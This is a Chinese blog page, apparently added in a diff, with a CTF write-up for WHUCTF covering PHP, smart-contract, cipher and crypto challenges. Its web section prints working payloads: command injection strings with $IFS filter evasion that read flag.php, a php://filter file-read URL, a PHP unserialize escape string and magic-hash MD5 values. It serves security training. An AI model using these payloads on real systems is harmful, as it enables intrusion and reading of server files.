@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function () {
+        if ('20180101wpx') {
+            if (prompt('请输入文章密码') !== '20180101wpx') {
+                alert('密码错误！');
+                if (history.length === 1) {
+                    location.replace("https://evenyao.com"); // 这里替换成你的首页
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Webezphp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phperror_reporting(0);highlight_file(__file__);$string_1 &#x3D; $_GET[&#39;str1&#39;];$string_2 &#x3D; $_GET[&#39;str2&#39;];&#x2F;&#x2F;1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WHUCTF">
+<meta property="og:url" content="http://www.zxfireworks.xyz/post/7ad3a98.html">
+<meta property="og:site_name" content="w1ndy">
+<meta property="og:description" content="Webezphp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phperror_reporting(0);highlight_file(__file__);$string_1 &#x3D; $_GET[&#39;str1&#39;];$string_2 &#x3D; $_GET[&#39;str2&#39;];&#x2F;&#x2F;1">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/whuctf_serialize.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd3.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include2.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/Smart_contract/WHUCTF_1/1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc0.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc1.jpg">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc2.jpg">
+<meta property="article:published_time" content="2020-05-23T07:24:33.000Z">
+<meta property="article:modified_time" content="2020-11-22T13:20:04.380Z">
+<meta property="article:author" content="w1ndy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/whuctf_serialize.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.zxfireworks.xyz/post/7ad3a98.html"/>
+
+
+
+
+
+  <title>WHUCTF | w1ndy</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w1ndy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+<!-- Global APlayer -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>
+<meting-js
+  auto="https://music.163.com/#/my/m/music/playlist?id=5013733903"
+  list-folded="true"
+  fixed="true"
+  lrc-type="0">
+</meting-js>
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.zxfireworks.xyz/post/7ad3a98.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">WHUCTF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-23T15:24:33+08:00">
+                2020-05-23
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:20:04+08:00">
+                2020-11-22
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/post/7ad3a98.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/post/7ad3a98.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="variable">$string_1</span> = <span class="variable">$_GET</span>[<span class="string">'str1'</span>];</span><br><span class="line"><span class="variable">$string_2</span> = <span class="variable">$_GET</span>[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">//1st</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2nd</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$string_1</span>))&#123;</span><br><span class="line">    <span class="variable">$md5_1</span> = md5(<span class="variable">$string_1</span>);</span><br><span class="line">    <span class="variable">$md5_2</span> = md5(<span class="variable">$string_2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = strtr(<span class="variable">$md5_1</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="variable">$b</span> = strtr(<span class="variable">$md5_2</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//3nd</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">if</span>(unserialize(<span class="variable">$r</span>)[1] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一关：利用%0a绕过(%0a经过url编码后时回车)<br>第二关：0e绕过(找到两个数，md5后都是0e开头的就可)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$count</span> = 0;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 1; <span class="variable">$i</span> &lt;= 100000000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$md5</span> = strtr(md5(<span class="variable">$i</span>), <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^0e\d+$/'</span>, <span class="variable">$md5</span>)) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$i</span> . <span class="string">" "</span> . md5(<span class="variable">$i</span>) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="variable">$count</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> == 2) &#123;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1=11230178&amp;str2=20493141</span><br></pre></td></tr></table></figure>
+<p>第三关：php反序列化字符逃逸</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">'123456xxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";&#125;'</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$r</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/whuctf_serialize.jpg" alt=""><br>下面是最终payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=2333%0a&amp;str1=11230178&amp;str2=20493141</span><br><span class="line">以post方式传入username=123456xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span>123456<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+<p>在源码中就可发现flag</p>
+<h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>打开链接啥也没有，源码中啥也没有，扫了下目录，发现有个index,下载下来里面就有flag,感觉是非预期，这应该是出题人疏忽了吧，也没用到题目中所说的命令执行，index文件内容如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd0.jpg" alt=""><br>最后题目修复了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd1.jpg" alt=""><br>扫一下目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd2.jpg" alt=""><br>题目过滤了许多关键词，需要绕过来读取flag.php<br>od命令：<a href="https://www.cnblogs.com/cxgg/p/9165062.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxgg/p/9165062.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;od<span class="variable">$IFS</span><span class="variable">$1</span>-tc<span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure>
+<p>或者用ca$@t来替换cat命令也可以读取flag.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;ca<span class="variable">$@t</span><span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure>
+<p>然后在源码中会发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd3.jpg" alt=""></p>
+<h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include0.jpg" alt=""><br>随便写点提交<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include1.jpg" alt=""><br>看见thankyou.php,盲猜flag.php,直接伪协议读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include2.jpg" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCg0KLy9mbGFnPXdodWN0ZntOMHdfeTB1X2tuMHdfZmlsZV9pbmNsdXNpb259DQoNCg==</span><br></pre></td></tr></table></figure>
+<p>base64解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag=whuctf&#123;N0w_y0u_kn0w_file_inclusion&#125;</span><br></pre></td></tr></table></figure>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h3><h4 id="智能合约-那是啥"><a href="#智能合约-那是啥" class="headerlink" title="智能合约? 那是啥"></a>智能合约? 那是啥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x202E653dA93c2a06076FC95B0A07E39B6003C5f6 Ropsten</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The CoinFlip contract does nothing...</span><br><span class="line"> */</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">	uint256 lashHash;</span><br><span class="line">	uint256 Factor = 20244007718664171871063861089;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">	constructor (string _flag) public &#123;</span><br><span class="line">		flag = _flag;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> getBalance () public returns(uint) &#123;</span><br><span class="line">		<span class="built_in">return</span> balances[tx.origin];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">		uint256 blockValue = uint256(block.blockhash(block.number - 1));</span><br><span class="line">		lashHash = blockValue;</span><br><span class="line">		uint256 ans = blockValue / Factor;</span><br><span class="line">		bool side = ans == 1 ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">			balances[tx.origin]++;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			balances[tx.origin] = 0;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> GetTheFlag() public view returns (string)&#123;</span><br><span class="line">		<span class="built_in">return</span> flag;  // You can get your flag here</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译一下，点击GetTheFlag就会输出flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Smart_contract/WHUCTF_1/1.jpg" alt=""></p>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="佛系青年BingGe"><a href="#佛系青年BingGe" class="headerlink" title="佛系青年BingGe"></a>佛系青年BingGe</h4><p>我看见我的朋友BingGe坐在信部网球场的栅栏边上看一本佛经，我很好奇，也过去看，只见上面写着: 佛曰：般羅穆僧冥神大侄所隸奢尼哆恐侄大藐若故曳咒室呐阿竟諳他缽悉爍諦哆咒豆苦缽尼帝所冥等上哆瑟俱薩諸諳伊冥特諳實怯他罰不參亦皤有婆僧藝俱羯怯至皤滅知真哆訶亦能怯瑟梵陀奢知呼故梵夢死有皤能薩曰俱穆勝竟怯明奢參世缽佛皤羯瑟奢孕梵逝楞呐醯故奢想謹提諦盡侄阿哆利俱吉罰老謹涅神能皤集實輸奢薩奢數哆波者俱勝俱所遠盡呐倒利闍盧諦罰薩梵曰度提大諦哆穆輸醯怯參侄諸娑梵伽知勝穆伊顛冥參道冥有<br>第一步与佛论禅解密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">767566536773bf1ef643676363676784e1d015847635575637560ff4f41d</span><br></pre></td></tr></table></figure>
+<p>尝试转ASCII，转换失败，题目中说到栅栏，栅栏解密，当为6栏时</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7768756374667b6e305f315f616d5f6e30745f615f36756464683173747d</span><br></pre></td></tr></table></figure>
+<p>转ASCII成功whuctf{n0_1_am_n0t_a_6uddh1st}</p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Bivibivi"><a href="#Bivibivi" class="headerlink" title="Bivibivi"></a>Bivibivi</h4><p>Do you know B-site?<br>nc 218.197.154.9 16387<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc0.jpg" alt=""><br>第一步就直接模逆运算，然后就没啥了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc2.jpg" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/cf64b99a.html" rel="next" title="命令执行">
+                <i class="fa fa-chevron-left"></i> 命令执行
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/post/9018b838.html" rel="prev" title="EternalBlue">
+                EternalBlue <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/header.jpg"
+                alt="w1ndy" />
+            
+              <p class="site-author-name" itemprop="name">w1ndy</p>
+              <p class="site-description motion-element" itemprop="description">时间从来不说话，却回答了所有问题</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
